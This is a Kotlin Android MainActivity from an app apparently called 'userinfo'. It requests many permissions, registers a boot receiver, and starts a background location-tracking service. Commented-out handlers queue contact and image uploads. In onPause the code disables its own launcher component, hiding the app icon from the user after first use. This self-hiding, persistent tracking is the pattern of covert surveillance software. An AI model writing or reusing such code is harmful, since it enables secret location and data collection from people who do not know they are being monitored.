package com.mobikasa.userinfo

import android.Manifest
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.*
import android.content.pm.PackageManager
import android.location.Location
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.databinding.DataBindingUtil
import com.mobikasa.userinfo.Service.DataService
import com.mobikasa.userinfo.Utils.Constants
import com.mobikasa.userinfo.Utils.NewPermisssion
import com.mobikasa.userinfo.Utils.RTPermissions
import com.mobikasa.userinfo.broadcastreciver.NetworkReciver
import com.mobikasa.userinfo.databinding.ActivityMainBinding


class MainActivity : AppCompatActivity(),LocationManager.LocationListener {

    val TAG="MainActivity"
    private  lateinit var databinding:ActivityMainBinding
    var mLocation: Location = Location("defult_location");

    var mLocationService: DataService = DataService()
    lateinit var mServiceIntent: Intent

    lateinit var bcr:NetworkReciver

    @SuppressLint("MissingPermission")
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        bcr= NetworkReciver()
        IntentFilter(Intent.ACTION_BOOT_COMPLETED).also {
            registerReceiver(bcr,it)
        }

        NewPermisssion(this).requestPermissons()

        (application as UserInfoApp).periodicdemo()



        //  RTPermissions.requestAllPermission(this,RTPermissions.permissionlist)
        databinding = DataBindingUtil.setContentView(this,R.layout.activity_main)


       /* GlobalScope.launch {
            (application as UserInfoApp).updateHeaderTable() }

        databinding.button1.setOnClickListener(View.OnClickListener {
            (application as UserInfoApp).contactsUpoadOneTimeWorkRequest()
        })

        databinding.button2.setOnClickListener(View.OnClickListener {
            (application as UserInfoApp).imageUpoadOneTimeWorkRequest()
        })*/

        //LocationManager.checkGpsStatus(this)

        //LocationManager(this).fetchLastDeviceLastLocation(this)


        databinding.button1.setOnClickListener(View.OnClickListener {

            if (RTPermissions(this).Check_ACCESS_FINE_LOCATION()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    if (!RTPermissions(this).Check_ACCESS_BACKGROUND_LOCATION()) {

                        showBackgroundPermissionAlert(this)

                    }else if (RTPermissions(this).Check_ACCESS_BACKGROUND_LOCATION()){
                        starServiceFunc()
                    }
                }else{
                    starServiceFunc()

                }


            } else{

                if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.ACCESS_FINE_LOCATION)) {
                    showLocationAlert(this)
                } else {
                    RTPermissions(this).request_ACCESS_BACKGROUND_LOCATION()
                }
            }


        })
        databinding.button2.setOnClickListener(View.OnClickListener {

            NewPermisssion(this).requestPermissons()

        })




    }

    fun showBackgroundPermissionAlert(mContext:Context)
    {

        AlertDialog.Builder(mContext).apply {
            setTitle("Background permission")
            setMessage(R.string.background_location_permission_message)
            setPositiveButton("Start service anyway",
                DialogInterface.OnClickListener { dialog, id ->
                    starServiceFunc()
                })
            setNegativeButton("Grant background Permission",
                DialogInterface.OnClickListener { dialog, id ->

                  //  RTPermissions.requestBackgroundLocation(this@MainActivity)
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    val uri = Uri.fromParts("package", packageName, null)
                    intent.data = uri
                    startActivity(intent)
                })
        }.create().show()


    }

    fun showLocationAlert(comtext:Context)
    {
        AlertDialog.Builder(this)
            .setTitle("ACCESS_FINE_LOCATION")
            .setMessage("Location permission required")
            .setPositiveButton(
                "OK"
            ) { _, _ ->
                RTPermissions(this).request_ACCESS_BACKGROUND_LOCATION()
            }
            .create()
            .show()

    }


    override fun onPause() {
        super.onPause()

        val packageManager = packageManager
        val componentName = ComponentName(this@MainActivity, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if(requestCode==1000 && grantResults.isNotEmpty())
        {
            var denidepermissionlist = mutableListOf<String>()

            denidepermissionlist.clear()

            for(i in grantResults.indices)
            {
                if(grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Log.d("UserInfo"," Accepted ${permissions[i]}")
                }else if (grantResults[i] == PackageManager.PERMISSION_DENIED){
                    denidepermissionlist.add(permissions[i])
                }

            }

            var pemissionnames=""

            for(j in denidepermissionlist)
            {
                pemissionnames="$pemissionnames\\$j"
            }

            if(pemissionnames.isNotEmpty()) {
               NewPermisssion(this).showBackgroundPermissionAlert(this,pemissionnames)
            }


        }

    }

    override fun onLocationGet(mLocation: Location) {
        this.mLocation = mLocation
        Log.d("DATA", "Location--------------->>$mLocation")

    }

    private fun starServiceFunc(){
        if (!Constants.isMyServiceRunning(DataService::class.java,this)) {
            val intent = Intent(this, DataService::class.java)
            intent.putExtra(Constants.BUNDLE_KEYS.SERVICE_TYPE, Constants.SERVICE.START)
            ContextCompat.startForegroundService(this, intent)
        }
    }

    private fun stopServiceFunc(){
        if (!Constants.isMyServiceRunning(DataService::class.java,this)) {
                val intent = Intent(this, DataService::class.java)
                intent.putExtra(Constants.BUNDLE_KEYS.SERVICE_TYPE, Constants.SERVICE.CLOSE)
                ContextCompat.startForegroundService(this, intent)
            }

    }




}